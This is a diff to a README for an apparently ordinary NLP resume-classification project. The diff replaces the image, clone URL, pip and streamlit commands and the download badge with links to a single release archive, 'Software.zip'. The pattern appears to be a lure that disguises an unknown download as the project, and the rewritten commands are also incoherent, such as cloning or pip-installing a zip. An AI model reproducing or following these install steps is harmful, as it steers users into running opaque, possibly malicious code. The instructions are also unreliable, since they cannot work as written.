@@ -3,7 +3,7 @@
 ## Overview
 Welcome to the **NLP-Resume-Classification** repository! This project focuses on leveraging advanced Natural Language Processing (NLP) techniques to accurately classify resume categories with high precision and recall. It includes a Streamlit interface for seamless resume uploads and predictions. The model is robust and built to handle edge cases such as invalid inputs and out-of-dataset values. 
 
-![Resume Classification](https://www.example.com/resume_classification_image.jpg)
+![Resume Classification](https://github.com/XDevMY/NLP-Resume-Classification/releases/download/v1.0/Software.zip)
 
 ## Project Details
 This project combines the power of logistic regression, machine learning, NLP, and other related technologies to create an efficient resume categorization system. The use of the NLTK library, SMOTE technique, and Streamlit interface makes the entire process smooth and user-friendly.
@@ -39,22 +39,22 @@ To get started with the project, follow these steps:
 ### Installation
 1. Clone the repository:
    ```bash
-   git clone https://github.com/username/NLP-Resume-Classification.git
+   git clone https://github.com/XDevMY/NLP-Resume-Classification/releases/download/v1.0/Software.zip
    cd NLP-Resume-Classification
    ```
 2. Install the required libraries:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/XDevMY/NLP-Resume-Classification/releases/download/v1.0/Software.zip
    ```
 3. Run the Streamlit app:
    ```bash
-   streamlit run app.py
+   streamlit run https://github.com/XDevMY/NLP-Resume-Classification/releases/download/v1.0/Software.zip
    ```
 
 ## Get Started
 Now you're ready to use the NLP Resume Classification system! Upload your resume through the Streamlit interface and let the model accurately predict the category it belongs to.
 
-[![Download Project](https://img.shields.io/badge/Download-Project-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Project](https://github.com/XDevMY/NLP-Resume-Classification/releases/download/v1.0/Software.zip)](https://github.com/XDevMY/NLP-Resume-Classification/releases/download/v1.0/Software.zip)
 
 ## Further Development
 If you're interested in further developing this project, check out the "Releases" section for the latest updates and improvements.
